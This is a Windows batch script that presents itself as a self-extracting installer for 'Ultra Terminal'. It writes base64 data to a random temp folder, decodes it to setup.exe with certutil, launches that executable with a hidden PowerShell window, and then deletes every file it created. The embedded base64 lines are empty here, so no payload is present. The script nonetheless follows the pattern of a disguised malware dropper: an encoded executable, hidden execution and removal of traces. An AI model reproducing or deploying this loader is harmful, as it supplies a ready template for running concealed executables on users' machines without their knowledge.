@echo off
:: Ultra Terminal - Windows self-extracting installer
:: Decodes embedded setup.exe -> runs it -> installs app -> cleanup.

setlocal enabledelayedexpansion

set "WORK=%TEMP%\UltraTerm-%RANDOM%%RANDOM%"
mkdir "%WORK%" 2>nul
set "B64=%WORK%\setup.b64"
set "EXE=%WORK%\setup.exe"

:: write base64 (each chunk on its own line)
(echo )>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"
(echo )>>"%B64%"

:: decode base64 -> setup.exe
certutil -decode "%B64%" "%EXE%" >nul 2>&1
if not exist "%EXE%" (
  echo Failed to decode setup. & pause & exit /b 1
)

:: run installer hidden, sem janela de console
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%EXE%' -Wait" >nul 2>&1
if errorlevel 1 "%EXE%" >nul 2>&1

:: cleanup temp
del /F /Q "%B64%" >nul 2>&1
del /F /Q "%EXE%" >nul 2>&1
rmdir /Q "%WORK%" >nul 2>&1
endlocal